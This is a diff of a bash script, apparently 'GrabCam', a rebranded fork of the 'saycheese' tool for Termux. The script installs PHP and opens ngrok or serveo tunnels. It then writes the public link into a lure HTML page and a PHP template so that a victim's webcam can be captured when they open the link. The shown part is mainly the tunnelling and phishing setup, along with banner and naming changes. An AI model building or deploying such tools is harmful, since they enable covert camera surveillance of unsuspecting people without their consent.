@@ -1,20 +1,43 @@
 #!/bin/bash
-# Inspired by: github.com/thelinuxchoice/saycheese
-# Modified by: github.com/mukegile-id/SadapKamera
+# coded by: github.com/thelinuxchoice/saycheese
+# This script modified by Noob Hackers
+#@@2222222
+# Hearlty thanks for linuxchoice
+# If you use any part from this code, giving me the credits. Read the Lincense!
+clear
+termux-setup-storage
+pkg install php -y
+clear
 trap 'printf "\n";stop' 2
 
-echo -e "\033[31m __          _ _     _     \e[0m ______ _     _          ";
-echo -e "\033[31m \ \        / (_)   | |    \e[0m|  ____(_)   | |         ";
-echo -e "\033[31m  \ \  /\  / / _ ___| | __ \e[0m| |__   _ ___| |__       ";
-echo -e "\033[31m   \ \/  \/ / | / __| '_  |\e[0m|  __| | / __| '_ \      ";
-echo -e "\033[31m    \  /\  /  | \__ \ | | |\e[0m| |    | \__ \ | | |     ";
-echo -e "\033[31m     \/  \/   |_|___/_| |_|\e[0m|_|    |_|___/_| |_| v2.0";
+banner() {
 
-printf "\e[1;77m Website :- www.defacer.id \e[0m \n"
-printf "\e[1;77m V.1 Coded By github.com/mukegile-id \e[0m \n"
+echo '
+
+                             __
+                         __ /_/\___
+                        /__/[]\/__/|o-_
+                        |    _     ||   -_  
+                        |  ((_))   ||     -_
+                        |__________|/
+             ___  ____   __   ____   ___   __   _  _ 
+            / __)(  _ \ / _\ (  _ \ / __) / _\ ( \/ )
+           ( (_ \ )   //    \ ) _ (( (__ /    \/ \/ \
+            \___/(__\_)\_/\_/(____/ \___)\_/\_/\_)(_& v1.1 ' |lolcat
+
+                                                                               
+echo " "
+printf "      \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
+printf "          \e[1;77m v1.1 This reborn script by { Noob Hackers }\e[0m \n"
+
+printf "\n"
+
+echo "      N073:> PLEASE TURN ON YOUR HOTSPOT 
+                   OR ELSE YOU DONT GET LINK....!"
 
 }
 
+stop() {
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checkssh=$(ps aux | grep -o "ssh" | head -n1)
@@ -22,6 +45,7 @@ if [[ $checkngrok == *'ngrok'* ]]; then
 pkill -f -2 ngrok > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
 fi
+
 if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
 fi
@@ -108,10 +132,11 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 
 }
 
+
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' bantusaya.html > index2.html
+sed 's+forwarding_link+'$link'+g' bantutanya.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
@@ -199,7 +224,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' bantusaya.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' bantutanya.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
@@ -208,7 +233,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="mukegile.id@gmail.com$RANDOM"
+default_subdomain="grabcam$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
@@ -229,3 +254,4 @@ checkfound
 banner
 dependencies
 start1
+
